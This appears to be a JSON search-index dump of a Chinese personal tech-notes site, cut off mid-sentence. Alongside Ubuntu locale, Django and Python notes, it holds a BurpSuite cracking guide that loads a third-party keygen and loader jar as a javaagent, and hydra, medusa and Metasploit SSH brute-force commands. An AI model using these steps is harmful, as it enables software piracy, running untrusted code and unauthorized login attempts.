安装中文包: apt update\napt install language-pack-zh-hans 设置区域为中文: localectl set-locale LANG=zh_CN.utf8 然后重启: reboot 可以查看当前设置的区域语言: locale 其他指令 查看语言支持的字体: check-language-support 然后都可以装上(如果没装, 可能会存在乱码问题), 一般应该是这些: sudo apt install fonts-droid-fallback ttf-wqy-zenhei ttf-wqy-microhei fonts-arphic-ukai fonts-arphic-uming 安装等宽字体, 有一个比较好的等宽字体叫Inconsolata, 在ubuntu中可安装: sudo apt install fonts-inconsolata 若不是这名, 可以搜索一下: apt search inconsolata 设置为指定的字体 Ubuntu字体及配置说明: https://wiki.ubuntu.org.cn/字体#.E9.85.8D.E7.BD.AE.fonts.conf 新建文件 ~/.config/fontconfig/fonts.conf : <?xml version=\"1.0\"?>\n<!DOCTYPE fontconfig SYSTEM \"/etc/fonts/conf.d/fonts.dtd\">\n<fontconfig>\n<match target=\"pattern\">\n  <test qual=\"any\" name=\"family\">\n    <string>monospace</string>\n  </test>\n  <edit name=\"family\" mode=\"prepend\" binding=\"strong\">\n    <string>inconsolata</string>\n  </edit>\n</match>\n<match target=\"pattern\">\n  <test qual=\"any\" name=\"family\">\n    <string>sans-serif</string>\n  </test>\n  <edit name=\"family\" mode=\"prepend\" binding=\"strong\">\n    <string>inconsolata</string>\n  </edit>\n</match>\n</fontconfig> 表示把 monospace 等宽字体和, sans-serif 无衬线体(对中文而言指的就是黑体) 都优先设置为 inconsolata . 这个时候查看默认字体与等宽字体都改变了: ~$ fc-match\nInconsolata.otf: \"Inconsolata\" \"Medium\"\n~$ fc-match monospace\nInconsolata.otf: \"Inconsolata\" \"Medium\" 具体参考: debian-ubuntu字体说明","tags":"操作系统","url":"/yq-docs-operating-system-linux-ubuntu-Ubuntu-Chinese-support.html","loc":"/yq-docs-operating-system-linux-ubuntu-Ubuntu-Chinese-support.html"},{"title":"工具-burpsuite","text":"BurpSuite 安装 官网 下载官方包 下载注册机\n- https://raw.githubusercontent.com/x-Ai/BurpSuite/main/BurpSuiteLoader.jar - https://raw.githubusercontent.com/x-Ai/BurpSuite/main/burp-keygen-scz.jar - 汉化文件 破解 打开安装包镜像后，将安装文件单独拉出来（拉出来才可以修改） 右键显示包内容 进入 Contents/Resources/app ， 将上述三个jar包复制进去 编辑 Contents/Info.plist 在 <string>-Dexe4j.moduleName=$APP_PACKAGE</string> 之后插入以下语句: <string>-noverify</string>\n<string>-javaagent:$APP_PACKAGE/Contents/Resources/app/BurpSuiteLoader.jar</string> 安装好后复制三个文件到 /Applications/Burp Suite Enterprise Edition/burp （有 burpsuite_pro_v2022.8.1.jar 的目录下） 安装成功后会在应用程序里有一个burp的文件夹，不同版本好像名称有差异 启动: cd /Applications/Burp Suite Enterprise Edition/burp; java -noverify -javaagent:BurpSuiteCnV2.0.jar -javaagent:BurpSuiteLoader.jar -Xmx2048m -jar burpsuite_pro_v2022.8.1.jar 此时会有提示激活的图形化界面， 打开 burp-keygen-scz.jar 注册机，来做相应的激活 burpsuite使用证书 搭建burpsuite服务时，可选使用证书 环境/工具 MacOS 12.5 openssl 步骤, 部分可参考 生成TLS(SSL)证书 : # 生成rsa私钥，des3算法，1024位强度，ssl.key是秘钥文件名。\nopenssl genrsa -des3 -out ssl.key 1024\n\n# 根据提示输入密码。当前文件夹下生成一个 ssl.key 文件。\n\n# 删除密码。\n# 这里目录和生成私钥的目录一致\nopenssl rsa -in ssl.key -out ssl.key\n\n# 生成 CSR（证书签名请求）。根据根据刚刚生成的 key 文件来生成证书请求文件\nopenssl req -new -key ssl.key -out ssl.csr\n\n# 依次输入国家、地区、城市、组织、组织单位、Common Name、Email 和密码。其中 Common Name 应该与域名保持一致。密码我们已经删掉了,直接回车即可。\n\n# 提示：Common Name 就是证书对应的域名地址，我们开发微信小程序时必须要让我们的外链的 https 的域名和证书统一才行。\n\n# 生成自签名证书。根据以上 2 个文件生成 crt 证书文件，终端执行下面命令：\n# 这里3650是证书有效期(单位：天)。这个大家随意。最后使用到的文件是key和crt文件。\nopenssl x509 -req -days 3650 -in ssl.csr -signkey ssl.key -out ssl.crt\n\n# 到这里我们的证书(ssl.key 和 ssl.crt) 就已经创建成功了可以直接用到 https 的 server 中了。\n\n\n# 在代码中使用证书：\nhttps\n    .createServer(\n        {\n            key: fs.readFileSync(\"./cert_key/ssl.key\"),\n            cert: fs.readFileSync(\"./cert_key/ssl.crt\")\n        },\n        app\n    )\n    .listen(1993);","tags":"安全","url":"/yq-docs-Safety-brup-Tool-Burpsuite.html","loc":"/yq-docs-Safety-brup-Tool-Burpsuite.html"},{"title":"macos使用brup","text":"安装过程暂不表述, 主要是已经忘了 证书配置 系统: macOS 13 打开burp设置代理地址 设置地址: 127.0.0.1:9998 设置浏览器代理地址 进入路径为 系统设置 -> wifi -> 详细信息 -> 网页代理 或者打开safari -> 偏好设置 -> 高级 -> 代理 http和https都可以设置好 浏览器打开该地址下载证书 点击右上角下载证书(可以重命名) 导入证书 comman + space 打开搜索, 找到 钥匙串访问 并打开, 进入 登录 -> 证书 进入 登录 -> 证书 将下载好的证书拖动到此页面, 并设置为始终信任(选中右键 -> 显示简介 -> 始终信任) 之后就可以在burp进行拦截了.","tags":"安全","url":"/yq-docs-Safety-brup-macos-uses-brup.html","loc":"/yq-docs-Safety-brup-macos-uses-brup.html"},{"title":"Kali安装、配置","text":"下载地址 ,\n选择自己合适的版本下载即可，下载后，直接解压打开（需提前准备好环境如虚拟机） 默认账户密码: kali\nkali\n# 旧版本是 root 跟 toor 一些其他工具默认账密 BeEF-XSS: Username: beef\nPassword: beef\nConfiguration File: /etc/beef-xss/config.yaml MySQL: User: root\nPassword: (blank)\nSetup Program: mysql_secure_installation OpenVAS: Username: admin\nPassword: <Generated during setup>\nSetup Program: openvas-setup Metasploit-Framework: Username: postgres\nPassword: postgres\nConfiguration File: /usr/share/metasploit-framework/config/database.yml 参考： https://www.kali.org/docs/introduction/default-credentials/ 换源 # 备份 mv /etc/apt/sources.list /etc/apt/sources.list.bak # 写入 echo \"deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib \" >/etc/apt/sources.list 安装vim, ssh apt update\napt install vim ssh 启动ssh # 或者 service ssh start /etc/init.d/ssh start # 可以通过 netstat -anutp 查看是否在监听22端口 # 设置开机启动 update-rc.d ssh enable","tags":"安全","url":"/yq-docs-Safety-kali-Kali-installation-configuration.html","loc":"/yq-docs-Safety-kali-Kali-installation-configuration.html"},{"title":"hydra","text":"暴力破解帐密 示例 # username存放在username.txt # password存放在pwd.txt # 以ssh形式破解192.168.135.123帐密 hydra -L username.txt -P pwd.txt 192 .168.135.123 ssh 注解 或者还是使用msfconsole msfconsole\n\nuse auxiliary/scanner/ssh/ssh_login set RHOSTS 192 .168.135.123 set PASS_FILE password.txt set USER_FILE username.txt\nexploit 爆破ssh: hydra -L 用户名文件 -P 用户密码文件 IP地址 ssh","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Hydra.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Hydra.html"},{"title":"maltego","text":"","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Maltego.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Maltego.html"},{"title":"nc","text":"","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Nick-name.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Nick-name.html"},{"title":"tor","text":"使用代理伪装 需要先apt安装: apt install tor 配置文件在: /etc/proxychains4.conf","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Tor.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-Tor.html"},{"title":"dirb","text":"服务目录扫描 示例 ┌── ( yanque㉿kali ) - [ ~ ] └─$ dirb http://www.coolshell.cn\n\n-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: Mon Jan 2 17 :59:28 2023 URL_BASE: http://www.coolshell.cn/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612 ---- Scanning URL: http://www.coolshell.cn/ ---- ( ! ) WARNING: NOT_FOUND [] not stable, unable to determine correct URLs { 30X } . ( Try using FineTunning: '-f' ) -----------------\nEND_TIME: Mon Jan 2 17 :59:29 2023 DOWNLOADED: 0 - FOUND: 0 ┌── ( yanque㉿kali ) - [ ~ ] └─$","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-dirb.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-dirb.html"},{"title":"exiftool","text":"查看文件注释","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-exifTool.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-exifTool.html"},{"title":"fcrackzip","text":"zip包的爆破 选项: -D ‘字典' 字典破解方式 -b 暴力破解方式 -c 暴力破解的字符类型，1=1~9,a=a~z,A=A~Z,!=字符,:=所有字符 -v 啰嗦模式，显示实时爆破信息 -l 指定破解的密码为几位数 -u 指定爆破文件 -p 破解的起始位置","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-fcrackzip.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-fcrackzip.html"},{"title":"medusa","text":"暴力破解帐密 示例 # password存放在pwd.txt # 以ssh形式破解192.168.135.123帐密 medusa -M ssh -h 192 .168.135.123 -u root -P pwd.txt","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-medusa.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-medusa.html"},{"title":"nikto","text":"","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-nikto.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-nikto.html"},{"title":"shodan","text":"IP地址信息收集","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-shodan.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-shodan.html"},{"title":"sqlmap","text":"渗透数据库","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-sqlmap.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-sqlmap.html"},{"title":"strings","text":"以字符串形式 查看图片","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-strings.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-strings.html"},{"title":"wfuzz","text":"爆破","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-wFuzz.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-wFuzz.html"},{"title":"whois","text":"域名注册信息收集 搜索 baidu.com 相关信息: ┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ whois baidu.com\nDomain Name: BAIDU.COM\nRegistry Domain ID: 11181110_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.markmonitor.com\nRegistrar URL: http://www.markmonitor.com\nUpdated Date: 2022-09-01T03:54:43Z\nCreation Date: 1999-10-11T11:05:17Z\nRegistry Expiry Date: 2026-10-11T11:05:17Z\nRegistrar: MarkMonitor Inc.\nRegistrar IANA ID: 292\nRegistrar Abuse Contact Email: abusecomplaints@markmonitor.com\nRegistrar Abuse Contact Phone: +1.2086851750\nDomain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\nDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\nDomain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\nDomain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited\nDomain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited\nDomain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited\nName Server: NS1.BAIDU.COM\nName Server: NS2.BAIDU.COM\nName Server: NS3.BAIDU.COM\nName Server: NS4.BAIDU.COM\nName Server: NS7.BAIDU.COM\nDNSSEC: unsigned\n...","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-whois.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-whois.html"},{"title":"wpscan","text":"漏洞扫描","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-wpscan.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-wpscan.html"},{"title":"Mac M1 Pro 安装 Kali","text":"下载地址 Kali Installer Kali 下载位置 安装 使用的工具是 Vmware Fusion 13 , 可以申请免费许可证使用. 注意安装的时候选择 Debain 即可. 选择 Debian 12 结束 安装过程略过, 一路点就行. 注意因为是安装器手动安装, 所以需要自己设置用户名与密码. 与以前 intel 直接下载虚拟机版本点开即用的方式不一样.","tags":"安全","url":"/yq-docs-Safety-kali-Mac-M1-installation-Kali.html","loc":"/yq-docs-Safety-kali-Mac-M1-installation-Kali.html"},{"title":"内部类Meta","text":"可用的选项 abstract abstract = True，表示这是一个 抽象基类 app_label 如果在 INSTALLED_APPS 中定义了一个应用程序之外的模型，它必须声明它属于哪个应用程序: app_label = 'myapp' 如果你想用 app_label.object_name 或 app_label.model_name 来表示一个模型，你可以分别使用: model._meta.label 或 model._meta.label_lower db_table 用于模型的数据库表的名称 base_manager_name 管理器的属性名 管理器的属性名，例如，'objects'，用于模型的 _base_manager。 说实话 没懂 db_tablespace 数据库表空间名称 表空间（Tablespaces） | Django 文档 | Django (djangoproject.com) default_manager_name 模型的管理器名称 模型的 _default_manager 管理器名称。 default_related_name 从相关对象到这个对象的关系默认使用的名称。默认为 _set 。 这个选项还可以设置 related_query_name 由于字段的反向名称应该是唯一的，所以如果你打算对你的模型进行子类化，就要小心了。\n为了避免名称冲突，名称的一部分应该包含 '%(app_label)s' 和 '%(model_name)s' ，\n它们分别被模型所在的应用程序的名称和模型的名称所取代，都是小写的。\n见 抽象模型的相关名称 段落。 get_latest_by 模型中的字段名或字段名列表 我的理解是 以这个字段集进行排序 managed 默认为True，表示Django 管理 数据库表的生命周期。 如果 False，将不对该模型进行数据库表的创建、修改或删除操作。\n如果该模型代表一个现有的表或一个通过其他方式创建的数据库视图，这一点很有用。\n这是在 managed=False 时 唯一 的区别。模型处理的所有其他方面都与正常情况完全相同。 order_with_respect_to 使该对象可以根据给定字段（通常是 ForeignKey ）进行排序。 ordering 对象的默认排序 permissions 表的额外权限 创建此对象时要输入权限表的额外权限。为每个模型自动创建添加、更改、删除和查看权限。\n这个例子指定了一个额外的权限，can_deliver_pizzas permissions = [('can_deliver_pizzas', 'Can deliver pizzas')] 这是一个由二元元组组成的列表或元组，格式为 (permission_code, human_readable_permission_name)。 default_permissions 默认值为 ('add', 'change', 'delete', 'view') 。 你可以自定义这个列表，例如，如果你的应用不需要任何默认的权限，可以将其设置为空列表。\n它必须在模型创建之前通过 migrate 在模型上指定，以防止任何遗漏的权限被创建。 proxy 如果 proxy = True ，作为另一个模型子类的模型将被视为 代理模型 required_db_features 当前连接应具备的数据库特征列表，以便在迁移阶段考虑模型。\n例如，如果你将此列表设置为 ['gis_enabled']，则模型将只在支持 GIS 的数据库上同步。\n在使用多个数据库后端进行测试时，跳过一些模型也很有用。避免模型之间的关系，\n这些模型可能会被创建，也可能不会被创建，因为 ORM 不会处理这个问题。 required_db_vendor 本模型所特有的支持的数据库厂商名称。目前的内置厂商名称是： sqlite ， postgresql ， mysql 和 oracle 。\n如果该属性不为空，且当前连接厂商与之不匹配，则该模型将不会同步。 select_on_save 确定 Django 是否会使用 1.6 之前的 django.db.models.Model.save() 算法.\n旧的算法使用 SELECT 来确定是否有一条现有的记录需要更新。\n新算法直接尝试 UPDATE 。在一些罕见的情况下，Django 看不到现有行的 UPDATE 。\n例如 PostgreSQL 的 ON UPDATE 触发器会返回 NULL 。\n在这种情况下，即使数据库中存在一条记录，新算法最终也会进行 INSERT 。 通常不需要设置这个属性。默认值是 False 。 关于新旧保存算法，请参见 django.db.models.Model.save() indexes 定义索引列表 如: from django.db import models\n\nclass Customer(models.Model):\n    first_name = models.CharField(max_length=100)\n    last_name = models.CharField(max_length=100)\n\n    class Meta:\n        indexes = [\n            models.Index(fields=['last_name', 'first_name']),\n            models.Index(fields=['first_name'], name='first_name_idx'),\n        ] unique_together 一组字段名，组合起来必须是唯一的 index_together 可以理解为联合索引 constraints 表约束 verbose_name 对象的注释 单数 verbose_name_plural 对象的复数，默认是上一个加s label 对象的表示，返回 app_label.object_name，例如 'polls.Question'。 label_lower 模型的表示，返回 app_label.model_name，例如 'polls.question'。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Internal-class-meta.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Internal-class-meta.html"},{"title":"CharField","text":"一个字符串字段，适用于小到大的字符串。 对于大量的文本，使用 TextField 该字段的默认表单部件是一个 TextInput。 CharField 有两个额外的参数： CharField.max_length 必须的。该字段的最大长度（以字符为单位）。\nmax_length 在数据库层面强制执行，在 Django 的验证中使用 MaxLengthValidator。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Charfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Charfield.html"},{"title":"FieldFile","text":"此节仅说明与FileField关系, 并不存在这样一个列, FileField 和 FieldFile 当你访问一个模型上的 FileField 时，你会得到一个 FieldFile 的实例作为访问底层文件的代理: class FieldFile FieldFile 的 API 与 File 的 API 相同，但有一个关键的区别。\n该类所封装的对象不一定是 Python 内置文件对象的封装 相反，\n它是 Storage.open() 方法结果的封装，该方法可能是 File 对象，也可能是自定义存储对 File API 的实现。 除了从 File 继承的 API，如 read() 和 write() 之外，FieldFile 还包括一些可以用来与底层文件交互的方法： 警告 该类的两个方法 save() 和 delete()，默认为将与相关 FieldFile 的模型对象保存在数据库中。 FieldFile.name 文件名，包括从关联的 Storage 的根部开始的相对路径 FileField。 FieldFile.path 一个只读属性，通过调用底层的 path() 方法，访问文件的本地文件系统路径。 FieldFile.size 底层 Storage.size() 方法的结果。 FieldFile.url 一个只读属性，通过调用底层 Storage 类的 Storage() 方法来访问文件的相对 URL。 FieldFile.open(mode='rb') 以指定的 mode 打开或重新打开与该实例相关的文件。与标准的 Python open() 方法不同，它不返回一个文件描述符。 因为在访问底层文件时，底层文件是隐式打开的，所以除了重置底层文件的指针或改变 mode 之外，可能没有必要调用这个方法。 FieldFile.close() 类似于标准的 Python file.close() 方法，关闭与该实例相关的文件。 FieldFile.save(name, content, save=True) 这个方法接收一个文件名和文件内容，并将它们传递给字段的存储类，然后将存储的文件与模型字段关联。\n如果你想手动将文件数据与模型上的 FileField 实例关联起来，那么 save() 方法用来持久化该文件数据。 取两个必要的参数。name 是文件的名称，content 是包含文件内容的对象。 可选的 save 参数控制在与该字段相关联的文件被更改后是否保存模型实例。默认为 True。 注解 content 参数应该是 django.core.files.File 的实例，而不是 Python 内置的文件对象。\n你可以从现有的 Python 文件对象构造一个 File，像这样: from django.core.files import File\n\nOpen an existing file using Python's built-in open()\nf = open('/path/to/hello.world')\nmyfile = File(f) 或者你可以从 Python 字符串中构建一个像这样的字符串: from django.core.files.base import ContentFile\nmyfile = ContentFile(\"hello world\") 更多信息，请参见 管理文件。 FieldFile.delete(save=True) 删除与此实例相关的文件，并清除字段的所有属性。\n注意：如果在调用 delete() 时，文件恰好被打开，本方法将关闭该文件。 可选的 save 参数控制在删除与该字段相关的文件后是否保存模型实例。默认值为 True。 注解 当一个模型被删除时，相关文件不会被删除。\n如果你需要清理遗留文件，你需要自己处理（例如，使用自定义管理命令，可以手动运行或通过例如 cron 定期运行）。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Fieldfile.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Fieldfile.html"},{"title":"类与对象","text":"主要关注点的是和类定义有关的常见编程模型。包括让对象支持常见的 Python\n特性、特殊方法的使用、类封装技术、继承、内存管理以及有用的设计模式。 改变对象的字符串显示 想改变对象实例的打印或显示输出，让它们更具可读性 重新定义它的 __str__() 和 __repr__() 方法. repr__() 方法返回一个实例的代码表示形式，通常用来重新构造这个实例。\n内置的 repr() 函数返回这个字符串，跟我们使用交互式解释器显示的值是一样的。\n__str__() 方法将实例转换为一个字符串，使用 str() 或 print() 函数会输出这个字\n符串: class Pair:\n  def __init__(self, x, y):\n    self.x = x\n    self.y = y\n\n  def __repr__(self):\n    return 'Pair({0.x!r}, {0.y!r})'.format(self)\n\n  def __str__(self):\n    return '({0.x!s}, {0.y!s})'.format(self) 使用: >>> p = Pair(3, 4)\n>>> p\nPair(3, 4) # __repr__() output\n>>> print(p)\n(3, 4) # __str__() output\n>>> 特别来讲，!r 格式化代码指明输出使用 __repr__() 来代替默认的 __str__(): >>> p = Pair(3, 4)\n>>> print('p is {0!r}'.format(p))\np is Pair(3, 4)\n>>> print('p is {0}'.format(p))\np is (3, 4)\n>>> 自定义 __repr__() 和 __str__() 通常是很好的习惯，因为它能简化调试和实例\n输出。例如，如果仅仅只是打印输出或日志输出某个实例，那么程序员会看到实例更加\n详细与有用的信息。 __repr__() 生成的文本字符串标准做法是需要让 eval(repr(x)) == x 为真。如\n果实在不能这样子做，应该创建一个有用的文本表示，并使用 < 和 > 括起来。比如: >>> f = open('file.dat')\n>>> f\n<_io.TextIOWrapper name='file.dat' mode='r' encoding='UTF-8'>\n>>> 如果 __str__() 没有被定义，那么就会使用 __repr__() 来代替输出。\n上面的 format() 方法的使用看上去很有趣，格式化代码 {0.x} 对应的是第 1 个\n参数的 x 属性。因此，在下面的函数中，0 实际上指的就是 self 本身: def __repr__(self):\n  return 'Pair({0.x!r}, {0.y!r})'.format(self) 也可以使用 % 操作符: 'Pair(%r, %r)' % (self.x, self.y) 自定义字符串的格式化 通过 format() 函数和字符串方法使得一个对象能支持自定义的格式化 需要在类上面定义 __format__() 方法 __format__() 方法给 Python 的字符串格式化功能提供了一个钩子。这里需要着\n重强调的是格式化代码的解析工作完全由类自己决定。因此，格式化代码可以是任何\n值 让对象支持上下文管理协议 想让你的对象支持上下文管理协议 (with 语句) with语句部分说明可见: with 需要实现 __enter__() 和 __exit__() 方法\n编写上下文管理器的主要原理是你的代码会放到 with 语句块中执行。当出现 with\n语句的时候，对象的 __enter__() 方法被触发，它返回的值 (如果有的话) 会被赋值给\nas 声明的变量。然后，with 语句块里面的代码开始执行。最后，__exit__() 方法被触\n发进行清理工作。 不管 with 代码块中发生什么，上面的控制流都会执行完，就算代码块中发生了异\n常也是一样的。事实上，__exit__() 方法的第三个参数包含了异常类型、异常值和追\n溯信息 (如果有的话)。__exit__() 方法能自己决定怎样利用这个异常信息，或者忽略\n它并返回一个 None 值。如果 __exit__() 返回 True ，那么异常会被清空，就好像什\n么都没发生一样，with 语句后面的程序继续在正常执行。 在 contextmanager 模块中有一个标准的上下文管理方案模板,\n可参考 contextlib 创建大量对象时节省内存方法 要创建大量 (可能上百万) 的对象，导致占用很大的内存 对于主要是用来当成简单的数据结构的类而言，你可以通过给类添加 __slots__\n属性来极大的减少实例所占的内存。比如: class Date:\n  __slots__ = ['year', 'month', 'day']\n\n  def __init__(self, year, month, day):\n    self.year = year\n    self.month = month\n    self.day = day 当你定义 __slots__ 后，Python 就会为实例使用一种更加紧凑的内部表示。实\n例通过一个很小的固定大小的数组来构建，而不是为每个实例定义一个字典，这跟元\n组或列表很类似。在 __slots__ 中列出的属性名在内部被映射到这个数组的指定小标\n上。使用 slots 一个不好的地方就是我们不能再给实例添加新的属性了，只能使用在\n__slots__ 中定义的那些属性名。 其实就是, 内部字典只能有 __slots__ 定义的属性 尽管 slots 看上去是一个很有用的特性，很多时候你还是得减少对它的使用冲动。\nPython 的很多特性都依赖于普通的基于字典的实现。另外，定义了 slots 后的类不再支\n持一些普通类特性了，比如多继承。大多数情况下，你应该只在那些经常被使用到的用\n作数据结构的类上定义 slots (比如在程序中需要创建某个类的几百万个实例对象)。 关于 __slots__ 的一个常见误区是它可以作为一个封装工具来防止用户给实例增\n加新的属性。尽管使用 slots 可以达到这样的目的，但是这个并不是它的初衷。__slots__\n更多的是用来作为一个内存优化工具。 在类中封装属性名 单下划线前缀, 类私有属性(类似 java 的 protect) 双下划线前缀, 基类私有属性, 防止被继承(类似 java 的 privite) 单下划线后缀, 防止与保留关键字冲突. 注意, 这些仅是一种编码约定. 封装类的实例上面的\"私有\"数据，但是 Python 语言并没有访问控制。 Python 程序员不去依赖语言特性去封装数据，而是通过遵循一定的属性和方法命\n名规约来达到这个效果。第一个约定是任何以单下划线 _ 开头的名字都应该是内部实\n现。 同时还要注意到，使用下划线开头的约定同样适用于模块名和模\n块级别函数。 使用双下划线开始会导致访问名称变成其他形式, 主要用于防止被继承. 有时候你定义的一个变量和某个保留关键字冲突，这时候可\n以使用单下划线作为后缀. 创建可管理的属性 想给某个实例 attribute 增加除访问与修改之外的其他处理逻辑，比如类型检查或合法性验证。 使用 @property 装饰器. 注意对应的有 @xxx.setter : 赋值时触发 @xxx.deleter : del xxx 时触发 还能在已存在的 get 和 set 方法基础上定义 property。例如: class Person:\n\n  def __init__(self, first_name):\n    self.set_first_name(first_name)\n\n  # Getter function\n  def get_first_name(self):\n    return self._first_name\n\n  # Setter function\n  def set_first_name(self, value):\n    if not isinstance(value, str):\n      raise TypeError('Expected a string')\n    self._first_name = value\n\n  # Deleter function (optional)\n  def del_first_name(self):\n    raise AttributeError(\"Can't delete attribute\")\n\n  # Make a property from existing get/set methods\n  name = property(get_first_name, set_first_name, del_first_name) 一个 property 属性其实就是一系列相关绑定方法的集合。如果你去查看拥有\nproperty 的类，就会发现 property 本身的 fget、fset 和 fdel 属性就是类里面的普通方\n法。比如: >>> Person.first_name.fget\n<function Person.first_name at 0x1006a60e0>\n>>> Person.first_name.fset\n<function Person.first_name at 0x1006a6170>\n>>> Person.first_name.fdel\n<function Person.first_name at 0x1006a62e0>\n>>> 通常来讲，你不会直接取调用 fget 或者 fset，它们会在访问 property 的时候自动\n被触发。 只有当你确实需要对 attribute 执行其他额外的操作的时候才应该使用到 property。 有时候一些从其他编程语言 (比如 Java) 过来的程序员总认为所有访问都应该通过\ngetter 和 setter，所以他们认为代码应该像下面这样写(比如我之前就是): class Person:\n\ndef __init__(self, first_name):\n  self.first_name = first_name\n\n@property\ndef first_name(self):\n  return self._first_name\n\n@first_name.setter\ndef first_name(self, value):\n  self._first_name = value 不要写这种没有做任何其他额外操作的 property。首先，它会让你的代码变得很臃\n肿，并且还会迷惑阅读者。其次，它还会让你的程序运行起来变慢很多。最后，这样的设\n计并没有带来任何的好处。 调用父类方法 想在子类中调用父类的某个已经被覆盖的方法。 使用 super() 函数, 可参考: 对super的理解 class A:\n  def spam(self):\n    print('A.spam')\n\nclass B(A):\n  def spam(self):\n    print('B.spam')\n    super().spam() # Call parent spam() super() 函数的一个常见用法是在 __init__() 方法中确保父类被正确的初始化了 对于你\n定义的每一个类，Python 会计算出一个所谓的方法解析顺序 (MRO) 列表。这个 MRO\n列表就是一个简单的所有基类的线性顺序表。例如: >>> C.__mro__\n(<class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>,\n<class '__main__.Base'>, <class 'object'>)\n>>> 为了实现继承，Python 会在 MRO 列表上从左到右开始查找基类，直到找到第一\n个匹配这个属性的类为止。 而这个 MRO 列表的构造是通过一个 C3 线性化算法来实现的。我们不去深究这个\n算法的数学原理，它实际上就是合并所有父类的 MRO 列表并遵循如下三条准则： 子类会先于父类被检查 多个父类会根据它们在列表中的顺序被检查 如果对下一个类存在两个合法的选择，选择第一个父类 然而，由于 super() 可能会调用不是你想要的方法，你应该遵循一些通用原则。首\n先，确保在继承体系中所有相同名字的方法拥有可兼容的参数签名 (比如相同的参数个\n数和参数名称)。这样可以确保 super() 调用一个非直接父类方法时不会出错。其次，\n最好确保最顶层的类提供了这个方法的实现，这样的话在 MRO 上面的查找链肯定可\n以找到某个确定的方法 子类中扩展 property 创建新的类或实例属性 创建一个新的拥有一些额外功能的实例属性类型，比如类型检查 如果你想创建一个全新的实例属性，可以通过一个描述器类的形式来定义它的功\n能。下面是一个例子: # Descriptor attribute for an integer type-checked attribute\nclass Integer:\n  def __init__(self, name):\n    self.name = name\n\ndef __get__(self, instance, cls):\n  if instance is None:\n    return self\n  else:\n    return instance.__dict__[self.name]\n\ndef __set__(self, instance, value):\n  if not isinstance(value, int):\n    raise TypeError('Expected an int')\n  instance.__dict__[self.name] = value\n\ndef __delete__(self, instance):\n  del instance.__dict__[self.name] 一个描述器就是一个实现了三个核心的属性访问操作 (get, set, delete) 的类，分别\n为 __get__() 、__set__() 和 __delete__() 这三个特殊的方法。这些方法接受一个实\n例作为输入，之后相应的操作实例底层的字典 为了使用一个描述器，需将这个描述器的实例作为类属性放到一个类的定义中。例\n如: class Point:\n  x = Integer('x')\n  y = Integer('y')\n\n  def __init__(self, x, y):\n    self.x = x\n    self.y = y 当你这样做后，所有对描述器属性 (比如 x 或 y) 的访问会被 __get__() 、__set__()\n和 __delete__() 方法捕获到。例如: >>> p = Point(2, 3)\n>>> p.x # Calls Point.x.__get__(p,Point)\n2\n>>> p.y = 5 # Calls Point.y.__set__(p, 5)\n>>> p.x = 2.3 # Calls Point.x.__set__(p, 2.3)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"descrip.py\", line 12, in __set__\n    raise TypeError('Expected an int')\nTypeError: Expected an int\n>>> 作为输入，描述器的每一个方法会接受一个操作实例。为了实现请求操作，会相应\n的操作实例底层的字典 (__dict__ 属性)。描述器的 self.name 属性存储了在实例字\n典中被实际使用到的 key。 描述器可实现大部分 Python 类特性中的底层魔法，包括 @classmethod 、\n@staticmethod 、@property ，甚至是 